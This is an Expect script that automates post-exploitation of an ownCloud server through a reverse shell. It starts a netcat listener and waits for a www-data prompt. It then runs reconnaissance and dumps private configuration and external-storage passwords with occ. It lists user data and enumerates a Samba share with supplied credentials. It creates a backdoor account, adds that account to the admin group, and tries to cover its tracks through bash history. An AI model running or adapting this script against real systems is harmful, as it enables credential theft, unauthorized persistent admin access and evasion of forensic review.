#!/usr/bin/expect -f

set timeout 120

set PORT [lindex $argv 0]
set SAMBA_SHARE [lindex $argv 1]
set SAMBA_USER [lindex $argv 2]
set SAMBA_PW [lindex $argv 3]
set BACKDOOR_USER [lindex $argv 4]
set BACKDOOR_USER_PASSWORD [lindex $argv 5]

# Start reverse shell listener

send_tty -- "\nStarting connect back shell on port $PORT ...\n"
spawn sudo netcat -lp $PORT

# Some basic recon on the sec-share
send_tty -- "\nExecute basic recon on sec-share ...\n"

send_tty -- "\n"
expect "www-data@"
sleep 2
send -- "pwd\n"

send_tty -- "\n"
expect "www-data@"
sleep 6
send -- "ls -la\n"

send_tty -- "\n"
expect "www-data@"
sleep 4
send -- "uname -a\n"

send_tty -- "\n"
expect "www-data@"
sleep 10
send -- "which occ\n"

send_tty -- "\n"
expect "www-data@"
sleep 8
send -- "/usr/local/bin/occ config:list --private\n"

send_tty -- "\n"
expect "www-data@"
sleep 20
send -- "/usr/local/bin/occ files_external:list --show-password\n"

send_tty -- "\n"
expect "www-data@"
sleep 21
send -- "ls -laR /usr/local/src/owncloud/data\n"

send_tty -- "\n"
expect "www-data@"
sleep 10
send -- "smbclient -L $SAMBA_SHARE -U $SAMBA_USER%$SAMBA_PW\n"

send_tty -- "\n"
expect "www-data@"
sleep 25
send -- "OC_PASS=$BACKDOOR_USER_PASSWORD /usr/local/bin/occ user:add $BACKDOOR_USER --password-from-env\n"

send_tty -- "\n"
expect "www-data@"
sleep 3
send -- "/usr/local/bin/occ  group:add-member -m $BACKDOOR_USER admin\n"

send_tty -- "\n"
expect "www-data@"
sleep 3
send -- "echo '' . ~/.bash_history && exit\n"

expect eof